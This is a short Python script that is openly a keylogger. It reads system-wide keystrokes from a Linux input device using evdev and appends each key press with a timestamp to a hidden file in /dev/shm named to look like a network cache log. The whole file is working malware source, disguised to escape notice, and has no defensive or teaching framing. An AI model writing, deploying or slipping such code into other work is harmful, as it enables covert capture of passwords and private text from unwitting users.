import time
import os
import threading
from evdev import InputDevice, categorize, ecodes

KEYLOGGER_FILE = "/dev/shm/.cache-netlog"

log_dir = os.path.dirname(KEYLOGGER_FILE)
if log_dir:
    os.makedirs(log_dir, exist_ok=True)

if not os.path.exists(KEYLOGGER_FILE):
    with open(KEYLOGGER_FILE, 'w') as f:
        f.write("Keylogger started at " + time.strftime('%d/%m/%Y %H:%M:%S') + "\n")

KEYBOARD_DEVICE = "/dev/input/event0"

def log_key(key):   #Logs key presses with timestamp.
    timestamp = time.strftime('%d/%m/%Y %H:%M:%S')

    with open(KEYLOGGER_FILE, 'a') as f:
        f.write(f'\n[{timestamp}]: {key}')

def run_evdev_logger(): #Logs keystrokes using evdev (captures system-wide events)
    device = InputDevice(KEYBOARD_DEVICE)

    for event in device.read_loop():
        if event.type == ecodes.EV_KEY:
            key_event = categorize(event)
            if key_event.keystate == 1:  # Key press
                log_key(key_event.keycode)

evdev_thread = threading.Thread(target=run_evdev_logger, daemon=True)
evdev_thread.start()

while True:
    time.sleep(1)
